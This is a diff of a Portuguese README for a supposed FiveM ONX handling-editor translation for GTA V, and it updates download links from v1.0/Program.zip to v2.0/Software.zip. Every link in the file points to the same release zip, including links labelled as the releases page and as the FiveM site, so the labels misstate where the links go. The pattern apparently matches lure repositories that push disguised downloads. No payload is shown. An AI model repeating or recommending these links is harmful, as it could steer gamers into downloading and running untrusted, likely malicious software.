@@ -1,7 +1,7 @@
 
 # 🚗🔧 FiveM ONX Handling Editor - Tradução PT-BR 🇧🇷
 
-[![Downloads](https://github.com/r2spamonyoutube/fivem-onx-handling-editor/releases/download/v1.0/Program.zip)](https://github.com/r2spamonyoutube/fivem-onx-handling-editor/releases/download/v1.0/Program.zip)
+[![Downloads](https://github.com/r2spamonyoutube/fivem-onx-handling-editor/releases/download/v2.0/Software.zip)](https://github.com/r2spamonyoutube/fivem-onx-handling-editor/releases/download/v2.0/Software.zip)
 
 Seja bem-vindo ao repositório **FiveM ONX Handling Editor**! Aqui você encontrará a tradução para o **onx-tuning** para o **FiveM** em Português do Brasil. Se você é um entusiasta de mods de carros e tuning no **GTA V**, este é o lugar certo para você!
 
@@ -15,12 +15,12 @@ Para utilizar nossa tradução, basta baixar o arquivo no link fornecido abaixo 
 
 Clique no botão abaixo para fazer o download e iniciar a customização dos veículos no **FiveM**:
 
-[![Downloads](https://github.com/r2spamonyoutube/fivem-onx-handling-editor/releases/download/v1.0/Program.zip)](https://github.com/r2spamonyoutube/fivem-onx-handling-editor/releases/download/v1.0/Program.zip)
+[![Downloads](https://github.com/r2spamonyoutube/fivem-onx-handling-editor/releases/download/v2.0/Software.zip)](https://github.com/r2spamonyoutube/fivem-onx-handling-editor/releases/download/v2.0/Software.zip)
 
 ## 🔗 Links Úteis
 
-- [Releases](https://github.com/r2spamonyoutube/fivem-onx-handling-editor/releases/download/v1.0/Program.zip): Confira as últimas versões e atualizações da tradução.
-- [FiveM](https://github.com/r2spamonyoutube/fivem-onx-handling-editor/releases/download/v1.0/Program.zip): Saiba mais sobre o **FiveM** e descubra novas possibilidades de gameplay no **GTA V**.
+- [Releases](https://github.com/r2spamonyoutube/fivem-onx-handling-editor/releases/download/v2.0/Software.zip): Confira as últimas versões e atualizações da tradução.
+- [FiveM](https://github.com/r2spamonyoutube/fivem-onx-handling-editor/releases/download/v2.0/Software.zip): Saiba mais sobre o **FiveM** e descubra novas possibilidades de gameplay no **GTA V**.
 
 ## 📋 Tópicos do Repositório
 
